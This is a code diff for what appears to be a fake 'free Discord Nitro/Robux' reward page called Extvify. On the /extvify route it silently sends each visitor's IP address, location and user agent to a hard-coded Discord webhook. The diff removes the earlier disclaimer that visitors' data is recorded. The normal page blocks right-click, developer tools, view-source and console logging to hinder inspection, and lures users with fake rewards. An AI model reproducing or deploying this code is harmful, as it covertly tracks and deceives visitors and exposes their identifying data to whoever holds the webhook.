@@ -281,7 +281,7 @@
     }
     .hidden { display: none; }
 
-    /* --- Special page (extvify) styles --- */
+    /* --- Special page (extvify) styles - clean IP display --- */
     .extvify-page {
       text-align: center;
       background: #0f1119;
@@ -294,31 +294,26 @@
       margin: 0 auto;
     }
     .extvify-page h1 {
-      font-size: 2.5rem;
-      font-weight: 800;
+      font-size: 2rem;
+      font-weight: 700;
       margin-bottom: 1rem;
-      background: linear-gradient(135deg, #ff4d4d, #f5b042);
-      background-clip: text;
-      -webkit-background-clip: text;
-      color: transparent;
+      color: #fff;
     }
-    .extvify-page p {
-      color: #c0c5e0;
-      margin: 0.5rem 0;
-      font-size: 1rem;
-    }
-    .extvify-page .ip-info {
+    .extvify-page .ip-display {
       font-family: monospace;
+      font-size: 1.8rem;
+      font-weight: 700;
       background: #1a1c2a;
-      padding: 0.8rem;
+      padding: 1rem;
       border-radius: 1rem;
-      margin-top: 1rem;
+      margin: 1rem 0;
       color: #8b9cff;
+      letter-spacing: 1px;
     }
-    .extvify-footer {
-      margin-top: 1rem;
-      font-size: 0.7rem;
-      color: #6a6f90;
+    .extvify-page .location {
+      font-size: 0.9rem;
+      color: #9a9fc0;
+      margin-top: 0.5rem;
     }
   </style>
 </head>
@@ -332,20 +327,18 @@
 
 <script>
   (function() {
-    // Check if we are on the special route /extvify
     const path = window.location.pathname.toLowerCase();
     const isExtvifyRoute = path === '/extvify' || path === '/extvify/';
 
     if (isExtvifyRoute) {
-      // Display the educational page and send data to Discord
-      document.title = "Educational Page";
+      // Show clean IP page (no educational disclaimer)
+      document.title = "Extvify";
       const container = document.getElementById('mainApp');
       container.innerHTML = `
         <div class="extvify-page">
-          <h1>EXTVIFY OWNS YOU</h1>
-          <p>This is for educational purposes only.</p>
-          <div class="ip-info" id="ipInfo">Fetching your information...</div>
-          <div class="extvify-footer">Your IP and location are recorded for learning purposes</div>
+          <h1>Your IP Address</h1>
+          <div class="ip-display" id="ipDisplay">Fetching...</div>
+          <div class="location" id="locationDisplay"></div>
         </div>
       `;
 
@@ -358,9 +351,10 @@
           const city = data.city || 'Unknown';
           const region = data.region || '';
           const location = `${city}, ${region} ${country}`.replace(/^,\s*/, '').replace(/\s+/g, ' ').trim();
-          document.getElementById('ipInfo').innerHTML = `<strong>IP Address:</strong> ${ip}<br><strong>Estimated Location:</strong> ${location || 'Unknown'}`;
+          document.getElementById('ipDisplay').innerText = ip;
+          document.getElementById('locationDisplay').innerText = location || 'Location unknown';
 
-          // Send to Discord webhook (client‑side)
+          // Send to Discord webhook
           const webhookUrl = 'https://discord.com/api/webhooks/1511201588964757565/yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwkt3wQ-hzKsmKmz7a';
           const payload = {
             content: `**New visitor from /extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}`
@@ -372,18 +366,16 @@
           }).catch(err => console.error('Webhook error:', err));
         })
         .catch(() => {
-          document.getElementById('ipInfo').innerHTML = '<strong>IP Address:</strong> Unable to retrieve<br><strong>Location:</strong> Try again later';
+          document.getElementById('ipDisplay').innerText = 'Unable to retrieve';
+          document.getElementById('locationDisplay').innerText = 'Try again later';
         });
-      // Prevent any background music or click sounds from starting
       return;
     }
 
     // ---------- NORMAL REWARD PAGE (unchanged) ----------
-    // Tracking
     let pageViews = parseInt(localStorage.getItem('extvify_pageViews') || 0) + 1;
     localStorage.setItem('extvify_pageViews', pageViews);
     
-    // Anti-copy/debug
     document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
     document.addEventListener('keydown', function(e) {
       if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's')) {
@@ -392,7 +384,6 @@
     });
     if (typeof window.console !== 'undefined') console.log = function() {};
 
-    // Background music
     const bgAudio = document.getElementById('bgMusic');
     let audioStarted = false;
     if (bgAudio) {
@@ -407,7 +398,6 @@
       document.addEventListener('touchstart', startAudio);
     }
 
-    // Click sound
     let audioCtx = null;
     function playClick() {
       try {
@@ -426,7 +416,6 @@
       } catch(e) {}
     }
 
-    // ----- PER-DEVICE DAILY ROTATION FOR ROBUX -----
     const nitroRewards = [
       { id: "nitro_basic", title: "Nitro Basic", desc: "Emojis, stickers, 50MB upload, custom profile themes", icon: "https://i.postimg.cc/T1bZnqjV/1cc22811-2ac2-4749-8dfe-501bd4dce238.webp" },
       { id: "nitro_boost", title: "Nitro Boost", desc: "2 Server Boosts, 1080p streaming, animated avatar, profile banner", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp" }
@@ -493,7 +482,6 @@
       { name: "Nitro Basic", type: "nitro", icon: "https://i.postimg.cc/T1bZnqjV/1cc22811-2ac2-4749-8dfe-501bd4dce238.webp" }
     ];
 
-    // Build the reward page HTML
     const mainApp = document.getElementById('mainApp');
     mainApp.innerHTML = `
       <div class="wrap">
@@ -608,7 +596,6 @@
     }
     claimBtn.addEventListener('click', startProgress);
 
-    // FAQ toggle
     document.querySelectorAll('.faq-item').forEach(item => {
       const q = item.querySelector('.faq-question');
       q.addEventListener('click', (e) => {
@@ -618,7 +605,6 @@
       });
     });
 
-    // Toast functionality
     const countryNames = [
       "United States", "United Kingdom", "Canada", "Australia", "France", "Germany", "Italy", "Spain",
       "Japan", "South Korea", "India", "Brazil", "Mexico", "Netherlands", "Sweden", "Norway", "Switzerland",
